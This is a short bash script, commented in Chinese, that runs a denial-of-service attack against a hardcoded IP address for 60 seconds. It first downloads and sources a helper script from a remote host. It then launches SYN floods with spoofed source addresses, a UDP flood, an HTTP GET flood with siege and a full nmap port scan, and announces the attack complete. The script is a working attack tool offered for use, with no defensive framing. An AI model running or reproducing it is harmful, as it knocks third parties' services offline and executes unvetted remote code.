#!/bin/bash

FILE="function.sh"
[ ! -f "$FILE" ] && curl -sSL "https://raw.ogtt.tk/shell/function.sh" -o "$FILE"
[ -f "$FILE" ] && source "$FILE"

CHECK_ROOT
ADD hping3 nmap siege
# 設置目標和參數
target="66.42.61.110"  # 替換為目標 IP 或域名
port=80
duration=60  # 攻擊持續時間(秒)
threads=5    # 降低線程數以減少 CPU 負載


# 使用 nice 命令降低進程優先級
nice -n 19 bash << EOF &

# SYN flood (使用較少的線程)
for ((i=1; i<=threads; i++)); do
    hping3 -S -p $port --faster --rand-source $target &
done

# UDP flood (使用較小的數據包)
hping3 --udp -p $port --faster --data 64 $target &

# HTTP GET flood (使用較少的並發連接)
siege -c 100 -t ${duration}S http://$target &

# 輕量級端口掃描
nmap -p- -T4 --min-rate 1000 $target &

EOF

# 等待指定時間
sleep $duration

# 停止所有攻擊進程
killall hping3 siege nmap
echo "優化的攻擊完成。"
